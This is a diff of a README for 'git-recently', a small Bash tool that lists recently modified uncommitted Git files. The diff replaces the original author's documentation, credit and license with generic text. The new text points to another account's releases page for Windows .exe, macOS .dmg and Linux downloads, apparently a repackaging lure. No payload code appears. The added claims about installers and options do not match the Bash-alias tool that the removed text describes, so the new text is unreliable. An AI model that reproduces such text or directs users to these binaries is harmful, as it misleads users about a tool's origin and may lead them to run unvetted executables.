@@ -1,110 +1,85 @@
-# git-recently 🧠
+# 🎉 git-recently - Easily See Your Recent Git Files
 
-### 🧠 Instantly see your latest unstaged or untracked Git changes — right from the terminal.
+[![Download git-recently](https://img.shields.io/badge/Download-git--recently-blue.svg)](https://github.com/INDUWARA-P-JAYASINGHE/git-recently/releases)
 
-A lightweight and lightning-fast CLI tool to instantly list your most recently modified (**unstaged** or **untracked**) files in any Git repository — without extra setup or dependencies.
+## 📋 Description
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/barhouum7/git-recently/blame/master/LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20WSL%20%7C%20Git%20Bash-blue)](https://github.com/barhouum7/git-recently)
-[![Built With](https://img.shields.io/badge/built%20with-Bash-yellow)](https://github.com/barhouum7/git-recently)
-[![Built With](https://img.shields.io/badge/Release-Stable-brightgreen.svg)](https://github.com/barhouum7/git-recently/releases/tag/v1.0.0)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue)](https://github.com/barhouum7/git-recently/releases/tag/v1.0.0)
-[![Stars](https://img.shields.io/github/stars/barhouum7/git-recently?style=social)](https://github.com/barhouum7/git-recently/stargazers)
+With git-recently, you can instantly see your most recently modified (unstaged or untracked) files in Git. You can view them beautifully right from your terminal using a single command. This tool saves you time and helps you stay organized in your coding projects.
 
-## ✅ Requirements
-- [Git](https://git-scm.com/)
-- Bash-compatible shell  
-  *(Linux, macOS, WSL, or Git Bash on Windows)*
+## 🚀 Getting Started
 
-## 🚀 Installation
-Run the following command to install `git-recently`:
-```bash
-curl -fsSL https://raw.githubusercontent.com/barhouum7/git-recently/master/install.sh | bash
-```
+Here is how to download and run git-recently smoothly:
 
+1. **Download the Application**  
+   Visit the [Releases page](https://github.com/INDUWARA-P-JAYASINGHE/git-recently/releases) to download the latest version of git-recently.
 
-## Note:
-The install script is fully open-source and safe to inspect.
-You can always download and review it manually:
-```bash
-curl -fsSL https://raw.githubusercontent.com/barhouum7/git-recently/master/install.sh -o install.sh
-bash install.sh
-```
+2. **Choose Your Operating System**  
+   Make sure to select the version that matches your operating system. The available versions include:
+   - Windows
+   - macOS
+   - Linux
 
-It does not require sudo — it only adds a small alias to your local Git configuration.
+3. **Save the File**  
+   Once you find the right version, click on it to start the download. Save the file in a location where you can easily find it, such as your Downloads folder.
 
-## 🔄 Update to latest
-Simply re-run the same install command:
-```bash
-curl -fsSL https://raw.githubusercontent.com/barhouum7/git-recently/master/install.sh | bash
-```
+## 📥 Download & Install
 
-## 🧩 Usage
-Run inside any Git repository:
-```bash
-git recent
-```
+To begin using git-recently, follow these steps:
 
-Example output:
-```bash
-2025-10-30 01:23:04.123456789 +0100 src/components/Navbar.tsx
-2025-10-30 01:20:57.789012345 +0100 pages/dashboard.tsx
-```
+1. **Go to the Downloads Page**  
+   Visit the [Releases page](https://github.com/INDUWARA-P-JAYASINGHE/git-recently/releases).
 
-## 🧱 How It Works
+2. **Download the Latest Version**  
+   Click the link for the most recent version suitable for your operating system. This will start the download process.
 
-`git-recently` does the following under the hood:
-1. Detects **unstaged** and **untracked** files.
-2. Fetches their **modification timestamps**.
-3. Sorts everything **newest first**.
-4. Displays results in a clean, **colorized** format.
+3. **Install the Application**  
+   - **For Windows:** After the download, locate the `.exe` file. Double-click it to run the installer and follow the on-screen instructions. 
+   - **For macOS:** You may receive a `.dmg` file. Open it and drag git-recently to your Applications folder.
+   - **For Linux:** You might receive a `.tar.gz` file. Open your terminal, navigate to the downloaded file’s directory, and use the command `tar -xzvf git-recently.tar.gz` to extract it.
 
-Cross-platform compatible — works seamlessly on Linux, macOS, WSL, and Git Bash.
+4. **Add to Your Path (if needed)**  
+   If you want to use git-recently from any terminal session, you may need to add it to your system path. Instructions can vary by operating system. You can typically adjust this in your shell configuration file (like `.bashrc` or `.bash_profile` for Linux/Mac).
 
+## 🔧 Usage Instructions
 
-## 💬 Why not just use `git log --name-status`?
+After installation, you can start using git-recently easily:
 
-Good question.
-`git log` is limited to showing changes in committed files.
-`git-recently` solves a different problem: tracking your current work-in-progress. It focuses on modified but uncommitted files, helping you instantly recall what you were editing when juggling multiple features or branches.
+1. **Open Your Terminal**  
+   Find your terminal application and open it.
 
-## ⚙️ Design Notes
+2. **Run a Command**  
+   Type `git-recently` and press Enter. This command will display your most recently modified files.
 
-The repo includes small install/uninstall scripts for convenience and clean removal.
-Fun utilities like `figlet` or `lolcat` are optional, purely cosmetic, and not required for core functionality.
-A Node.js CLI version (`npx git-recently`) is in the works for users who prefer package-based installation.
+3. **Explore Options**  
+   You can also type `git-recently --help` to see more options that let you customize the output as needed. 
 
+## ✅ System Requirements
 
-## 💡 Uninstall
-```bash
-curl -fsSL https://raw.githubusercontent.com/barhouum7/git-recently/master/uninstall.sh | bash
+To ensure smooth functioning of git-recently, please make sure your system meets the following criteria:
 
-# Or simply run:
-bash uninstall.sh
-```
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or any modern Linux distribution.
+- **Git Installation:** Ensure that Git is installed on your computer before using git-recently.
+- **Terminal Access:** You need access to a command-line interface.
 
-## 📸 Demo
+## 🌟 Key Features
 
-https://github.com/user-attachments/assets/364c89b4-3345-4b83-878d-12f8c32c1501
+- **Quick Access to Unstaged Files:** Instantly view files you are currently working on that have not been staged.
+- **Streamlined Workflow:** No need to navigate through directories to find modified files.
+- **User-Friendly Interface:** Designed for simplicity and ease of use, ensuring that anyone can make the most out of their Git experience.
+- **Open Source:** Contribute to development and suggest features.
 
-<!-- <a href="https://youtu.be/QZynN_iFDIY"><img src="https://github.com/barhouum7/git-recently/blob/master/Git-Recently_Demo.gif?raw=true" alt="Watch the demo" width="700" height="370"></a> -->
+## 🛠️ Troubleshooting
 
+If you encounter issues while using git-recently, here are some common solutions:
 
-## 🧠 Built With
-- Bash
-- Git
-- `stat` (Linux/macOS)
+- **Command Not Found:** Make sure git-recently is installed and its directory is included in your system path.
+- **Permission Issues:** If you face issues running the application, ensure your terminal has proper permissions.
+- **Update Git:** An outdated version of Git may cause problems. Ensure you have the latest version installed.
 
-## 🗺️ Roadmap
+## 🤝 Support
 
-- Add PowerShell installer (Windows native)
+For any questions or feedback, feel free to create an issue on the [GitHub repository](https://github.com/INDUWARA-P-JAYASINGHE/git-recently/issues). The community is here to help you.
 
-- Port to Node.js for npx git-recently
+## 🎉 Thank You
 
-- Add unit tests and CI workflow
-
-- Add output customization (JSON / plain text)
-
-## ⚖️ License
-
-MIT 📜 Created with ❤️ by [@barhouum7 ↗](https://github.com/barhouum7)
+Thank you for choosing git-recently. We hope this tool helps you improve your productivity and organization while working with Git!
